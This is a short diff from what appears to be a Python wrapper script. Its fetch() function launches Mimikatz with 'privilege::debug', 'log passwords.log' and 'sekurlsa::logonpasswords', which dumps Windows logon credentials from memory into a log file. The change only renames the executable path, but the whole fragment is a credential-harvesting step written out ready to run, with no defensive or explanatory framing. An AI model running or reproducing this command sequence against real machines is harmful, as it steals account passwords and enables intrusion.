@@ -26,7 +26,7 @@ def print_out(string, _type, end="\n"):
 
 def fetch():
     timeout = 3
-    args = [PATH + "//x64//mimikatz_x64.exe",
+    args = [PATH + "//x64//MIMIKATZ.EXE",
             "privilege::debug",
             "log passwords.log",
             "sekurlsa::logonpasswords"]
